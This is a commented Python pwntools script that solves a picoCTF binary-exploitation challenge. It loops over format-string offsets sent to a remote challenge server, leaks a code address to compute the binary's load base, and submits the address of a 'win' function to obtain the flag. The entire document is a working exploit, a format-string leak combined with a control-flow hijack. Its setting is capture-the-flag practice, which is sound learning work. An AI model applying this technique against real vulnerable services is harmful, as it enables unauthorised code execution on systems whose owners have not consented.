#! /usr/bin/python3
from pwn import *
import itertools

port = int(input("Please enter the port: "))

# Loops through the values 1-40, trying out those stack locations.
for i in range(1,40):
 try:
  print("Currently on %s" % i)

  # Sets up the vuln binary exe as the test binary.
  # We can manipulate that to find win's location without having to do math.
  elf = context.binary = ELF('./vuln')
  # Connects to the remote server with the user provided port.
  p = remote("rescued-float.picoctf.net", port)

  # Reads through the connection text until it reaches the string 'name:'
  p.recvuntil(b'name:')

  # Sends the line that we'll be using to get the leak, .encode is necessary to quiet an annoying
  # pwntools warning.
  p.sendline(f'%{i}$p'.encode())
  # Grabs the leak from the web server.
  elf_leak = int(p.recvline(), 16)
  # Sets the start of the local binary executable's memory to what will hopefully be the web server's start.
  elf.address = elf_leak - 0x1400

  # Receives text from the web server until it matches '12345: '
  p.recvuntil(b'12345: ')

  # Gets the memory address of the win offset from the binary executable, then sends it in.
  mem = hex(elf.sym['win']).encode()
  print("Memory Location: %s" % mem)
  p.sendline(mem)

  # Gets the response, checks if the string 'won' is in it.
  res = p.clean().decode()
  if "won" in res:
   # If it is, we've gotten the flag and it prints it out before exiting the for loop.
   print("Flag Retrieved: %s" % res)
   p.close()
   break
  else:
   # Otherwise the connection is closed and the for loop iterates.
   p.close()
 # Sometimes the web server would spit out memory address vaues such as NULL which doesn't encode to binary.
 # This except is just an easier way of accounting for that problem.
 except:
  p.close()
  pass
